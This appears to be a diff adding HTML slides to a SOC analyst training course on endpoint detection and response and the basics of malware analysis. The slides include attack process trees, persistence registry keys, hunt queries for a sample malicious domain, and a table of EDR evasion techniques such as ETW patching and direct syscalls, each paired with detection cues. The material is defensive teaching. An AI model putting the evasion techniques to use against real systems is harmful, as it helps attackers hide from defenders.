+<!-- ================================================================================== -->
+<!-- MODULE 08: EDR FOUNDATIONS — 20 slides (94-113)                                     -->
+<!-- ================================================================================== -->
+
+<!-- SLIDE 94: M08 TITLE -->
+<div class="slide" data-module="Module 08: EDR Foundations">
+  <div style="text-align:center;">
+    <div style="font-family:'JetBrains Mono';color:var(--accent);margin-bottom:16px;">MODULE 08</div>
+    <h1>Endpoint Detection &amp; Response<br>EDR Operations</h1>
+    <p style="margin-top:32px;max-width:500px;margin-left:auto;margin-right:auto;">Process trees, registry/file monitoring, network telemetry, automated isolation, Velociraptor, and Defender for Endpoint. Master the tools that watch every endpoint.</p>
+    <div style="margin-top:24px;">
+      <i class="fa-solid fa-laptop-code fa-3x" style="margin:0 12px;color:var(--accent);"></i>
+      <i class="fa-solid fa-tree fa-3x" style="margin:0 12px;color:var(--accent2);"></i>
+      <i class="fa-solid fa-shield-halved fa-3x" style="margin:0 12px;color:var(--green);"></i>
+    </div>
+    <p style="margin-top:32px;font-size:15px;">20 slides -- press <strong>Next</strong> to start</p>
+  </div>
+</div>
+
+<!-- SLIDE 95: WHAT IS EDR -->
+<div class="slide" data-module="Module 08: EDR Foundations">
+  <div class="slide-header"><h2>What is EDR?</h2><span class="slide-num">CORE</span></div>
+  <p><strong>Endpoint Detection &amp; Response (EDR)</strong> continuously monitors endpoints for suspicious behavior and enables rapid investigation and response.</p>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:16px;">
+    <div class="card" style="border-left:3px solid var(--accent);">
+      <p style="font-size:14px;font-weight:600;">Detection</p>
+      <p style="font-size:13px;">Real-time behavioral monitoring: process creation, registry changes, network connections, file modifications. EDR catches what signatures miss.</p>
+    </div>
+    <div class="card" style="border-left:3px solid var(--green);">
+      <p style="font-size:14px;font-weight:600;">Response</p>
+      <p style="font-size:13px;">Isolate endpoints, kill processes, block IPs, quarantine files -- all from the management console without touching the endpoint directly.</p>
+    </div>
+    <div class="card" style="border-left:3px solid var(--accent2);">
+      <p style="font-size:14px;font-weight:600;">Investigation</p>
+      <p style="font-size:13px;">Process tree visualization, timeline reconstruction, full event history. EDR answers "what happened?" across the entire kill chain.</p>
+    </div>
+    <div class="card" style="border-left:3px solid var(--orange);">
+      <p style="font-size:14px;font-weight:600;">Hunting</p>
+      <p style="font-size:13px;">Search across all endpoints for IOCs (hashes, IPs, domains) and IOAs (suspicious process patterns, beaconing).</p>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 96: EDR vs AV vs SIEM -->
+<div class="slide" data-module="Module 08: EDR Foundations">
+  <div class="slide-header"><h2>EDR vs. AV vs. SIEM</h2><span class="slide-num">COMPARE</span></div>
+  <table class="tbl" style="margin-top:12px;">
+    <tr><th></th><th>Traditional AV</th><th>EDR</th><th>SIEM</th></tr>
+    <tr><td><strong>Method</strong></td><td>Signature + heuristic</td><td>Behavioral + IoC + IOA</td><td>Log correlation from many sources</td></tr>
+    <tr><td><strong>Scope</strong></td><td>Single endpoint</td><td>Fleet of endpoints</td><td>Enterprise-wide (all log sources)</td></tr>
+    <tr><td><strong>Response</strong></td><td>Block/quarantine only</td><td>Isolate, investigate, remediate</td><td>Alert only (no direct endpoint action)</td></tr>
+    <tr><td><strong>Retention</strong></td><td>Limited logs</td><td>90+ days of telemetry</td><td>30 days to years</td></tr>
+    <tr><td><strong>Example</strong></td><td>Windows Defender AV</td><td>MDE, CrowdStrike, SentinelOne</td><td>Splunk, Elastic, Wazuh</td></tr>
+  </table>
+  <p style="margin-top:10px;font-size:14px;color:var(--yellow);">EDR and SIEM are complementary. EDR gives deep endpoint visibility. SIEM correlates EDR alerts with network, cloud, and identity logs.</p>
+</div>
+
+<!-- SLIDE 97: EDR ARCHITECTURE -->
+<div class="slide" data-module="Module 08: EDR Foundations">
+  <div class="slide-header"><h2>EDR Architecture</h2><span class="slide-num">DIAGRAM</span></div>
+  <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px;margin-top:16px;">
+    <div class="card" style="text-align:center;">
+      <div style="font-size:32px;color:var(--accent);"><i class="fa-solid fa-microchip"></i></div>
+      <p style="font-size:15px;font-weight:600;margin-top:8px;">Agent</p>
+      <p style="font-size:13px;">Installed on every endpoint. Collects telemetry via kernel drivers, ETW, API hooks. Sends to backend.</p>
+    </div>
+    <div style="font-size:32px;color:var(--muted);display:flex;align-items:center;justify-content:center;">→</div>
+    <div class="card" style="text-align:center;">
+      <div style="font-size:32px;color:var(--accent2);"><i class="fa-solid fa-cloud"></i></div>
+      <p style="font-size:15px;font-weight:600;margin-top:8px;">Backend / Cloud</p>
+      <p style="font-size:13px;">Ingests, processes, correlates telemetry. Runs detection rules, ML models. Stores 90+ days.</p>
+    </div>
+    <div style="font-size:32px;color:var(--muted);display:flex;align-items:center;justify-content:center;">→</div>
+    <div class="card" style="text-align:center;">
+      <div style="font-size:32px;color:var(--green);"><i class="fa-solid fa-display"></i></div>
+      <p style="font-size:15px;font-weight:600;margin-top:8px;">Console</p>
+      <p style="font-size:13px;">Web UI for triage, investigation, response. Process trees, timelines, alert queue, isolation controls.</p>
+    </div>
+  </div>
+  <div class="terminal" style="margin-top:12px;font-size:13px;">
+    <span class="comment"># Agent sends to backend via TLS (port 443). Typical agent memory: 50-200 MB.</span>
+    <span class="comment"># Backend can be on-prem (MDE for Government) or SaaS (CrowdStrike, SentinelOne).</span>
+  </div>
+</div>
+
+<!-- SLIDE 98: PROCESS TREES -->
+<div class="slide" data-module="Module 08: EDR Foundations">
+  <div class="slide-header"><h2>Process Trees</h2><span class="slide-num">INVESTIGATE</span></div>
+  <p>The <strong>process tree</strong> is the most powerful EDR investigation tool. It shows every process spawn in parent-child relationship.</p>
+  <div class="terminal" style="font-size:12px;line-height:1.6;">
+<span style="color:#3b82f6;">explorer.exe (PID 4520)</span>
+<span style="color:#fff;">  └─ winword.exe (PID 6124)  <span class="comment">// User opened phishing doc</span></span>
+<span style="color:#fff;">       └─ cmd.exe (PID 6780)     <span class="comment">// Macro launched cmd</span></span>
+<span style="color:#fff;">            └─ powershell.exe (PID 6902) <span class="hl">// Suspicious</span></span>
+<span style="color:#fff;">                 └─ rundll32.exe (PID 7001) <span class="hl">// Beacon loaded</span></span>
+<span style="color:#fff;">                      └─ ${APPDATA}\updater.exe (PID 7100) <span class="err">// Malware</span></span>
+  </div>
+  <p style="margin-top:8px;font-size:14px;">Each level adds context. WinWord → cmd → PowerShell is never legitimate in a SOC environment.</p>
+  <p style="font-size:14px;color:var(--yellow);">Key EDR features: collapse/expand subtrees, search within tree, export as JSON.</p>
+</div>
+
+<!-- SLIDE 99: PROCESS TREE LAB -->
+<div class="slide" data-module="Module 08: EDR Foundations">
+  <div class="slide-header"><h2>Lab: Investigate a Process Tree</h2><span class="slide-num">LAB</span></div>
+  <p>Given this process tree from an EDR console, answer the questions below:</p>
+  <div class="terminal" style="font-size:12px;">
+<span style="color:#3b82f6;">services.exe (PID 720)</span>
+<span style="color:#fff;">  └─ svchost.exe -k netsvcs (PID 1100)</span>
+<span style="color:#fff;">       └─ wmiprvse.exe (PID 3200) <span class="comment">// WMI provider host</span></span>
+<span style="color:#fff;">            └─ cmd.exe /c whoami (PID 4000)</span>
+<span style="color:#fff;">                 └─ powershell.exe -Enc ... (PID 4100) <span class="hl">// Encoded command</span></span>
+<span style="color:#fff;">                      └─ rundll32.exe (PID 4200)</span>
+<span style="color:#fff;">                           └─ regsvr32.exe (PID 4300) <span class="err">// LOLBin</span></span>
+  </div>
+  <div style="margin-top:8px;font-size:14px;">
+    <p><strong>Questions:</strong></p>
+    <p>1. What was the initial execution method?</p>
+    <p>2. Which process is the earliest malicious indicator?</p>
+    <p>3. What LOLBin was used for lateral movement?</p>
+    <p style="color:var(--muted);">Answers: 1. WMI (wmiprvse.exe), 2. cmd.exe /c whoami, 3. regsvr32.exe</p>
+  </div>
+</div>
+
+<!-- SLIDE 100: REGISTRY MONITORING -->
+<div class="slide" data-module="Module 08: EDR Foundations">
+  <div class="slide-header"><h2>Registry Monitoring</h2><span class="slide-num">PERSISTENCE</span></div>
+  <p>EDR tracks registry changes in real time. Attackers use the registry for persistence, configuration, and evasion.</p>
+  <table class="tbl" style="margin-top:12px;">
+    <tr><th>Registry Key</th><th>Used By Attacker For</th><th>EDR Detection</th></tr>
+    <tr><td><code>HKLM\...\Run</code></td><td>Persistence via Run keys</td><td>Alert on new non-standard value</td></tr>
+    <tr><td><code>HKLM\...\Image File Execution Options</code></td><td>IFEO hijacking, debugger redirect</td><td>Alert on IFEO modifications</td></tr>
+    <tr><td><code>HKLM\...\Services</code></td><td>Service persistence (new service)</td><td>Alert on service creation/modification</td></tr>
+    <tr><td><code>HKCU\...\UserInitMprLogonScript</code></td><td>Logon script persistence</td><td>Alert on script value changes</td></tr>
+    <tr><td><code>HKLM\...\Winlogon</code></td><td>Winlogon helper DLL injection</td><td>Alert on Notify/Userinit changes</td></tr>
+  </table>
+  <p style="margin-top:8px;font-size:14px;">EDR also tracks registry values and data, not just key paths. Example: a Run key pointing to <code>%TEMP%</code> is suspicious even if the key name is legitimate.</p>
+</div>
+
+<!-- SLIDE 101: FILE SYSTEM MONITORING -->
+<div class="slide" data-module="Module 08: EDR Foundations">
+  <div class="slide-header"><h2>File System Monitoring</h2><span class="slide-num">IOC</span></div>
+  <p>EDR records all file creates, writes, deletes, renames, and loads. This is critical for malware stage detection.</p>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px;">
+    <div class="card" style="border-left:3px solid var(--red);">
+      <p style="font-size:14px;font-weight:600;">Malicious File Patterns</p>
+      <p style="font-size:13px;">Dropper writes to <code>%TEMP%\svchost.exe</code><br>
+      Ransomware renames files to <code>.locked</code><br>
+      DLL sideloading from <code>AppData\Local\Temp</code><br>
+      Staged beacon writes to <code>%APPDATA%\Microsoft\</code></p>
+    </div>
+    <div class="card" style="border-left:3px solid var(--green);">
+      <p style="font-size:14px;font-weight:600;">File IoC Scanning</p>
+      <p style="font-size:13px;">Upload unknown file hash to VT from console<br>
+      YARA scan on endpoint from EDR<br>
+      Search all endpoints for a file hash<br>
+      Quarantine malicious files across fleet</p>
+    </div>
+  </div>
+  <p style="margin-top:8px;font-size:14px;">Example EDR search: <code>file_path:C:\Users\*\AppData\Local\Temp\*.exe AND parent_process:winword.exe</code></p>
+</div>
+
+<!-- SLIDE 102: NETWORK CONNECTIONS -->
+<div class="slide" data-module="Module 08: EDR Foundations">
+  <div class="slide-header"><h2>Network Connections from EDR</h2><span class="slide-num">C2</span></div>
+  <p>EDR agents capture outbound network connections: destination IP, port, protocol, process, and bytes transferred.</p>
+  <table class="tbl" style="margin-top:12px;">
+    <tr><th>Field</th><th>Legitimate</th><th>Suspicious</th></tr>
+    <tr><td>Process</td><td><code>svchost.exe</code>, <code>firefox.exe</code></td><td><code>rundll32.exe</code>, <code>regsvr32.exe</code>, <code>wmiprvse.exe</code></td></tr>
+    <tr><td>Destination</td><td>Known CDN, corporate proxy</td><td>Unknown IP, geolocation mismatch, new domain</td></tr>
+    <tr><td>Port</td><td>443, 80</td><td>High ports (4444, 8080, 1337), non-standard</td></tr>
+    <tr><td>Frequency</td><td>Bursts (page loads)</td><td>Periodic beacon (every 60s)</td></tr>
+    <tr><td>Bytes</td><td>Variable</td><td>Small, consistent (C2 keepalive)</td></tr>
+  </table>
+  <p style="margin-top:8px;font-size:14px;color:var(--yellow);">EDR network data is less complete than full packet capture but available on every endpoint. Look for process-behavior mismatches.</p>
+</div>
+
+<!-- SLIDE 103: THREAT INTEL + IOC SCANNING -->
+<div class="slide" data-module="Module 08: EDR Foundations">
+  <div class="slide-header"><h2>IoC Scanning &amp; Threat Intel</h2><span class="slide-num">HUNT</span></div>
+  <p>EDR consoles let you search the entire fleet for IOCs in seconds.</p>
+  <div class="terminal" style="font-size:13px;">
+<span class="comment"># MDE: Hunt for a file hash across all endpoints</span>
+<span class="prompt">MDE&gt;</span><span class="cmd"> FileHash == "e3c0a..."</span>
+<span class="ok">3 endpoints found with this hash</span>
+<span class="comment"># CrowdStrike: Search for domain connections</span>
+<span class="prompt">CS&gt;</span><span class="cmd"> DomainName CONTAINS "evil-update.cdn"</span>
+<span class="ok">12 network events from 2 endpoints</span>
+<span class="comment"># SentinelOne: YARA scan on endpoint</span>
+<span class="prompt">S1&gt;</span><span class="cmd"> YARA rule "cobaltstrike_beacon" apply to endpoint 450</span>
+<span class="ok">Scan completed. 1 match found.</span>
+  </div>
+  <p style="margin-top:8px;font-size:14px;">Automated intel feed integration: STIX/TAXII feeds automatically create IoC watches in the EDR. New IoC → auto-scan fleet.</p>
+</div>
+
+<!-- SLIDE 104: AUTOMATED RESPONSE -->
+<div class="slide" data-module="Module 08: EDR Foundations">
+  <div class="slide-header"><h2>Automated Response Actions</h2><span class="slide-num">RESPOND</span></div>
+  <p>When a detection fires, EDR can auto-respond or wait for analyst approval (recommended).</p>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px;">
+    <div class="card" style="text-align:center;border-left:3px solid var(--red);">
+      <p style="font-size:24px;"><i class="fa-solid fa-ban"></i></p>
+      <p style="font-size:14px;font-weight:600;">Isolate Endpoint</p>
+      <p style="font-size:12px;">Cut all network traffic except to EDR backend. Prevents lateral movement and C2.</p>
+    </div>
+    <div class="card" style="text-align:center;border-left:3px solid var(--orange);">
+      <p style="font-size:24px;"><i class="fa-solid fa-skull"></i></p>
+      <p style="font-size:14px;font-weight:600;">Kill Process</p>
+      <p style="font-size:12px;">Terminate malicious process and all child processes. Stops active execution.</p>
+    </div>
+    <div class="card" style="text-align:center;border-left:3px solid var(--yellow);">
+      <p style="font-size:24px;"><i class="fa-solid fa-trash"></i></p>
+      <p style="font-size:14px;font-weight:600;">Quarantine File</p>
+      <p style="font-size:12px;">Move malicious file to secure quarantine folder. Prevents re-execution.</p>
+    </div>
+    <div class="card" style="text-align:center;border-left:3px solid var(--accent);">
+      <p style="font-size:24px;"><i class="fa-solid fa-list"></i></p>
+      <p style="font-size:14px;font-weight:600;">Block IoC</p>
+      <p style="font-size:12px;">Add file hash, IP, or domain to blocklist. Prevents future execution across fleet.</p>
+    </div>
+  </div>
+  <p style="margin-top:8px;font-size:14px;color:var(--yellow);">Isolation is the nuclear option. Use it when lateral movement is suspected or C2 is confirmed.</p>
+</div>
+
+
+
+<!-- SLIDE 107: WINDOWS DEFENDER FOR ENDPOINT -->
+<div class="slide" data-module="Module 08: EDR Foundations">
+  <div class="slide-header"><h2>Microsoft Defender for Endpoint</h2><span class="slide-num">MDE</span></div>
+  <p>MDE is Microsoft's EDR, built into Windows 10/11 Enterprise E5. It's the most widely deployed EDR globally.</p>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px;">
+    <div class="card">
+      <p style="font-size:14px;font-weight:600;color:var(--accent);">Key Features</p>
+      <p style="font-size:13px;">
+        - Process tree investigation (cloud-powered)<br>
+        - Automated investigation + remediation<br>
+        - Threat analytics (real-time intel)<br>
+        - Live Response (remote shell)<br>
+        - ASR rules (attack surface reduction)<br>
+        - Device discovery (unmanaged endpoints)
+      </p>
+    </div>
+    <div class="card">
+      <p style="font-size:14px;font-weight:600;color:var(--green);">SOC Analyst View</p>
+      <p style="font-size:13px;">
+        - Alert queue: severity, category, affected users<br>
+        - Incident view: related alerts grouped<br>
+        - Device timeline: scrollable event history<br>
+        - Advanced hunting: Kusto Query Language (KQL)<br>
+        - Threat &amp; vulnerability management (TVM)
+      </p>
+    </div>
+  </div>
+  <p style="margin-top:8px;font-size:14px;">MDE is pre-installed on Windows 10/11. Activate with the appropriate license and onboard via GPO or Intune.</p>
+</div>
+
+<!-- SLIDE 108: EDR BYPASS TECHNIQUES -->
+<div class="slide" data-module="Module 08: EDR Foundations">
+  <div class="slide-header"><h2>EDR Bypass Techniques</h2><span class="slide-num">TTP</span></div>
+  <p>Attackers actively try to evade EDR. Know the techniques to detect them.</p>
+  <table class="tbl" style="margin-top:12px;">
+    <tr><th>Technique</th><th>How It Works</th><th>EDR Detection</th></tr>
+    <tr><td>Process Hollowing</td><td>Spawn legit process, replace memory with malicious code</td><td>EID 8 (CreateRemoteThread), memory region anomalies</td></tr>
+    <tr><td>DLL Sideloading</td><td>Place malicious DLL in app search path</td><td>EID 7 (Image loaded from non-standard path)</td></tr>
+    <tr><td>Living-off-the-Land (LOLBins)</td><td>Use built-in tools for malicious actions</td><td>Command-line analysis, parent-child chain</td></tr>
+    <tr><td>Direct Syscalls</td><td>Bypass user-mode API hooks via syscall instruction</td><td>Kernel callback monitoring, ETW event gap</td></tr>
+    <tr><td>ETW Patching</td><td>Modify ETW provider to suppress telemetry</td><td>ETW state change alerts, tamper detection</td></tr>
+  </table>
+  <p style="margin-top:8px;font-size:14px;color:var(--yellow);">EDR vendors constantly update bypass detection. What works today may be detected tomorrow.</p>
+</div>
+
+<!-- SLIDE 109: DETECTING EDR BYPASSES -->
+<div class="slide" data-module="Module 08: EDR Foundations">
+  <div class="slide-header"><h2>Detecting EDR Bypass Attempts</h2><span class="slide-num">DETECT</span></div>
+  <p>Most bypass attempts leave telemetry artifacts. Train your eyes to spot them.</p>
+  <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:12px;">
+    <div class="card" style="border-left:3px solid var(--red);">
+      <p style="font-size:14px;font-weight:600;">Tamper Alerts</p>
+      <p style="font-size:13px;">EDR agent stopped, uninstalled, or driver disabled. <strong>Always escalate.</strong> Tamper = attacker is actively hiding.</p>
+    </div>
+    <div class="card" style="border-left:3px solid var(--orange);">
+      <p style="font-size:14px;font-weight:600;">Unsigned Drivers</p>
+      <p style="font-size:13px;">Kernel driver load with invalid signature. EDR bypass tools often load malicious drivers (e.g., ProcExp bypass).</p>
+    </div>
+    <div class="card" style="border-left:3px solid var(--yellow);">
+      <p style="font-size:14px;font-weight:600;">ETW Disable Events</p>
+      <p style="font-size:13px;">Event ID in Sysmon/ETW indicating provider was disabled. Often done right before credential dumping.</p>
+    </div>
+    <div class="card" style="border-left:3px solid var(--accent);">
+      <p style="font-size:14px;font-weight:600;">Suspicious Call Stack</p>
+      <p style="font-size:13px;">Process with no loaded DLLs or unusual call stack (no ntdll/kernel32). Indicates direct syscall execution.</p>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 110: EDR ALERT TRIAGE -->
+<div class="slide" data-module="Module 08: EDR Foundations">
+  <div class="slide-header"><h2>EDR Alert Triage</h2><span class="slide-num">WORKFLOW</span></div>
+  <p>When an EDR alert comes in, follow this triage sequence:</p>
+  <div style="display:flex;flex-direction:column;gap:6px;margin-top:12px;">
+    <div style="display:flex;align-items:center;gap:10px;">
+      <span style="background:var(--accent);color:#000;border-radius:50%;width:22px;height:22px;display:inline-flex;align-items:center;justify-content:center;font-weight:bold;font-size:11px;">1</span>
+      <span style="font-size:14px;"><strong>Check process tree</strong> -- Is the parent-child chain suspicious?</span>
+    </div>
+    <div style="display:flex;align-items:center;gap:10px;">
+      <span style="background:var(--accent2);color:#000;border-radius:50%;width:22px;height:22px;display:inline-flex;align-items:center;justify-content:center;font-weight:bold;font-size:11px;">2</span>
+      <span style="font-size:14px;"><strong>Review command line</strong> -- Any encoded commands, LOLBin usage, unusual flags?</span>
+    </div>
+    <div style="display:flex;align-items:center;gap:10px;">
+      <span style="background:var(--green);color:#000;border-radius:50%;width:22px;height:22px;display:inline-flex;align-items:center;justify-content:center;font-weight:bold;font-size:11px;">3</span>
+      <span style="font-size:14px;"><strong>Check network connections</strong> -- C2 destination? Beacon pattern?</span>
+    </div>
+    <div style="display:flex;align-items:center;gap:10px;">
+      <span style="background:var(--cyan);color:#000;border-radius:50%;width:22px;height:22px;display:inline-flex;align-items:center;justify-content:center;font-weight:bold;font-size:11px;">4</span>
+      <span style="font-size:14px;"><strong>Check file artifacts</strong> -- Dropped files, quarantined items, YARA match?</span>
+    </div>
+    <div style="display:flex;align-items:center;gap:10px;">
+      <span style="background:var(--orange);color:#000;border-radius:50%;width:22px;height:22px;display:inline-flex;align-items:center;justify-content:center;font-weight:bold;font-size:11px;">5</span>
+      <span style="font-size:14px;"><strong>Check registry</strong> -- Persistence mechanism? New Run keys, service, scheduled task?</span>
+    </div>
+    <div style="display:flex;align-items:center;gap:10px;">
+      <span style="background:var(--red);color:#000;border-radius:50%;width:22px;height:22px;display:inline-flex;align-items:center;justify-content:center;font-weight:bold;font-size:11px;">6</span>
+      <span style="font-size:14px;"><strong>Scope</strong> -- Same alert on other endpoints? Broader campaign?</span>
+    </div>
+  </div>
+</div>
+
+<!-- SLIDE 111: EDR INVESTIGATION WORKFLOW -->
+<div class="slide" data-module="Module 08: EDR Foundations">
+  <div class="slide-header"><h2>Full Investigation Workflow</h2><span class="slide-num">PROCESS</span></div>
+  <div style="display:flex;flex-direction:column;gap:8px;margin-top:12px;">
+    <div style="display:flex;align-items:center;gap:10px;">
+      <span style="background:var(--accent);color:#000;border-radius:50%;width:28px;height:28px;display:inline-flex;align-items:center;justify-content:center;font-weight:bold;font-size:14px;">1</span>
+      <span style="font-size:15px;"><strong>Triage</strong> -- Verify alert is TP. Check process tree + command line.</span>
+    </div>
+    <div style="display:flex;align-items:center;gap:10px;">
+      <span style="background:var(--accent2);color:#000;border-radius:50%;width:28px;height:28px;display:inline-flex;align-items:center;justify-content:center;font-weight:bold;font-size:14px;">2</span>
+      <span style="font-size:15px;"><strong>Contain</strong> -- Isolate the endpoint if C2 or lateral movement is confirmed.</span>
+    </div>
+    <div style="display:flex;align-items:center;gap:10px;">
+      <span style="background:var(--green);color:#000;border-radius:50%;width:28px;height:28px;display:inline-flex;align-items:center;justify-content:center;font-weight:bold;font-size:14px;">3</span>
+      <span style="font-size:15px;"><strong>Collect</strong> -- Pull forensic artifacts (memory dump, event logs, prefetch, registry).</span>
+    </div>
+    <div style="display:flex;align-items:center;gap:10px;">
+      <span style="background:var(--cyan);color:#000;border-radius:50%;width:28px;height:28px;display:inline-flex;align-items:center;justify-content:center;font-weight:bold;font-size:14px;">4</span>
+      <span style="font-size:15px;"><strong>Analyze</strong> -- Determine scope of compromise. Timeline reconstruction in EDR console.</span>
+    </div>
+    <div style="display:flex;align-items:center;gap:10px;">
+      <span style="background:var(--orange);color:#000;border-radius:50%;width:28px;height:28px;display:inline-flex;align-items:center;justify-content:center;font-weight:bold;font-size:14px;">5</span>
+      <span style="font-size:15px;"><strong>Remediate</strong> -- Kill processes, quarantine files, remove persistence, block IoCs.</span>
+    </div>
+    <div style="display:flex;align-items:center;gap:10px;">
+      <span style="background:var(--yellow);color:#000;border-radius:50%;width:28px;height:28px;display:inline-flex;align-items:center;justify-content:center;font-weight:bold;font-size:14px;">6</span>
+      <span style="font-size:15px;"><strong>Recover</strong> -- Reconnect isolated endpoint. Verify no residual compromise.</span>
+    </div>
+    <div style="display:flex;align-items:center;gap:10px;">
+      <span style="background:var(--red);color:#000;border-radius:50%;width:28px;height:28px;display:inline-flex;align-items:center;justify-content:center;font-weight:bold;font-size:14px;">7</span>
+      <span style="font-size:15px;"><strong>Improve</strong> -- Write new detection rule. Update playbook. Feed TTP to threat intel.</span>
+    </div>
+  </div>
+</div>
+
+
+<!-- SLIDE 113: M08 SUMMARY -->
+<div class="slide" data-module="Module 08: EDR Foundations">
+  <div style="text-align:center;">
+    <h2 style="color:var(--text);margin-bottom:16px;">Module 08 Complete</h2>
+    <div style="font-size:80px;margin-bottom:24px;">
+      <i class="fa-regular fa-circle-check" style="color:var(--green);"></i>
+    </div>
+    <p style="font-size:22px;color:var(--text);margin-bottom:16px;">You can now:</p>
+    <div style="display:flex;flex-direction:column;align-items:center;gap:8px;margin:0 auto 24px;font-size:17px;max-width:500px;">
+      <div class="card">Understand EDR architecture and capabilities</div>
+      <div class="card">Investigate process trees in an EDR console</div>
+      <div class="card">Detect persistence via registry monitoring</div>
+      <div class="card">Use EDR for IoC scanning across the fleet</div>
+      <div class="card">Perform automated response actions (isolate, kill, quarantine)</div>
+      <div class="card">Triage EDR alerts using a structured workflow</div>
+    </div>
+    <div style="padding:16px;border:1px solid var(--border);border-radius:8px;background:var(--slide-bg);max-width:500px;margin:0 auto;">
+      <p style="font-size:15px;color:var(--accent);font-weight:600;">Next: Module 10 (Malware Analysis)</p>
+      <p style="font-size:14px;color:var(--muted);">Apply your EDR and detection skills to malware analysis. Triage samples, use online sandboxes, extract IOCs, and write analysis reports.</p>
+    </div>
+    <p style="margin-top:20px;font-size:14px;color:var(--muted);">
+      <a href="#" onclick="showSlide(0);return false;" style="color:var(--accent);">← Back to Dashboard</a>
+    </p>
+  </div>
+
+<!-- ================================================================================== -->
+<!-- MODULE 10: MALWARE ANALYSIS — 2 slides (114-115)                                     -->
+<!-- ================================================================================== -->
+
+<!-- SLIDE 114: M10 TITLE -->
+<div class="slide" data-module="Module 10: Malware Analysis">
+  <div style="text-align:center;">
+    <div style="font-family:'JetBrains Mono';color:var(--accent);margin-bottom:16px;">MODULE 10</div>
+    <h1>Malware Analysis Basics<br>What Every SOC Analyst Needs</h1>
+    <p style="margin-top:32px;max-width:500px;margin-left:auto;margin-right:auto;">Static and dynamic analysis, online sandboxes, VirusTotal, PE structure, strings, and behavior classification. You don't need to be a reverse engineer — just know how to triage samples.</p>
+    <div style="margin-top:24px;">
+      <i class="fa-solid fa-bug fa-3x" style="margin:0 12px;color:var(--accent);"></i>
+      <i class="fa-solid fa-microscope fa-3x" style="margin:0 12px;color:var(--accent2);"></i>
+      <i class="fa-solid fa-globe fa-3x" style="margin:0 12px;color:var(--green);"></i>
+    </div>
+    <p style="margin-top:32px;font-size:15px;">20 slides -- press <strong>Next</strong> to start</p>
+  </div>
+</div>
+
+<!-- SLIDE 115: WHAT IS MALWARE ANALYSIS -->
+<div class="slide" data-module="Module 10: Malware Analysis">
+  <div class="slide-header"><h2>What is Malware Analysis?</h2><span class="slide-num">CORE</span></div>
+  <p><strong>Malware analysis</strong> is the process of examining a suspicious file or URL to determine what it does, how it works, and how to detect it.</p>
+  <div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;margin-top:16px;">
+    <div class="card" style="text-align:center;">
+      <p style="font-size:28px;color:var(--accent);"><i class="fa-solid fa-file-lines"></i></p>
+      <p style="font-size:14px;font-weight:600;">Static Analysis</p>
+      <p style="font-size:12px;">Examining the file without executing it. Strings, PE headers, hashes, metadata. Safe, fast, no sandbox needed.</p>
+    </div>
+    <div class="card" style="text-align:center;">
+      <p style="font-size:28px;color:var(--accent2);"><i class="fa-solid fa-play"></i></p>
+      <p style="font-size:14px;font-weight:600;">Dynamic Analysis</p>
+      <p style="font-size:12px;">Running the file in an isolated sandbox. Observe behavior: processes, network, file system, registry.</p>
+    </div>
+    <div class="card" style="text-align:center;">
+      <p style="font-size:28px;color:var(--green);"><i class="fa-solid fa-memory"></i></p>
+      <p style="font-size:14px;font-weight:600;">Memory Analysis</p>
+      <p style="font-size:12px;">Dumping and analyzing process memory. Find injected code, hidden processes, encryption keys.</p>
+    </div>
+  </div>
+  <p style="margin-top:8px;font-size:14px;color:var(--yellow);">SOC analysts mainly do static+triage + online sandbox analysis. Deep reverse engineering is for the malware analysis team.</p>
+</div>
+
+  </div>
+
+<script>
+// Module metadata (inline, no external JSON needed)
+
+var modules = [
+  {id:'01-fundamentals', title:'Computer & Network Fundamentals', desc:'Windows OS, processes, services, logs, user accounts.', slides:10, phase:'beginner', tag:'beginner'},
+  {id:'02-logs', title:'Logs — The Language of Security', desc:'Windows Security & Sysmon, Linux auth/syslog, web server, firewall, DNS, email logs.', slides:20, phase:'beginner', tag:'beginner'},
+  {id:'03-win-internals', title:'Windows Internals for Defenders', desc:'LSASS, svchost, DLL loading, process injection, Sysinternals tools.', slides:9, phase:'beginner-plus', tag:'beginner+'},
+  {id:'04-threat-landscape', title:'Understanding the Threat Landscape', desc:'Malware types, phishing, BEC, insider threats, supply chain, LOLBins.', slides:12, phase:'beginner-plus', tag:'beginner+'},
+  {id:'06-detection-engineering', title:'Detection Engineering', desc:'IOC vs IOA, Sigma rules, YARA rules, regex. Write detections.', slides:13, phase:'intermediate', tag:'intermediate'},
+  {id:'07-siem', title:'SIEM Foundations & Operations', desc:'Splunk, Elastic, Wazuh. Ingestion, search, dashboards, correlation.', slides:10, phase:'intermediate', tag:'intermediate'},
+  {id:'08-edr', title:'Endpoint Detection & Response', desc:'Process trees, registry monitoring, isolation, Velociraptor, Defender.', slides:17, phase:'intermediate', tag:'intermediate'},
+  {id:'09-snort', title:'IDS/IPS with Snort', desc:'Snort NIDS/NIPS: modes, rule syntax, reading alerts, SIEM correlation.', slides:5, phase:'intermediate', tag:'intermediate'},
+  {id:'10-malware-analysis', title:'Malware Analysis Basics', desc:'Static/dynamic analysis, hashes, strings, PE structure, sandbox execution.', slides:2, phase:'intermediate-plus', tag:'intermediate+'},
+  {id:'11-threat-intel', title:'Threat Intelligence Operations', desc:'IOC enrichment, OSINT, VirusTotal, AbuseIPDB, OTX, ThreatFox.', slides:15, phase:'intermediate-plus', tag:'intermediate+'},
+  {id:'12-threat-hunting', title:'Threat Hunting', desc:'Proactive hypothesis-driven hunts across endpoint, network, and logs.', slides:15, phase:'intermediate-plus', tag:'intermediate+'},
+  {id:'13-case-studies', title:'Real-World Case Studies', desc:'Emotet, TrickBot, LockBit, Cobalt Strike, AsyncRAT walkthroughs.', slides:20, phase:'intermediate-plus', tag:'intermediate+'},
+  {id:'14-purple-team', title:'Purple Team Labs', desc:'Run attacks → detect → write rules. Full attack chain exercises.', slides:20, phase:'intermediate-plus', tag:'intermediate+'},
+  {id:'15-reporting', title:'Security Reporting & Communication', desc:'Executive summaries, timelines, root cause analysis, incident reports.', slides:15, phase:'intermediate-plus', tag:'intermediate+'}
+];
+
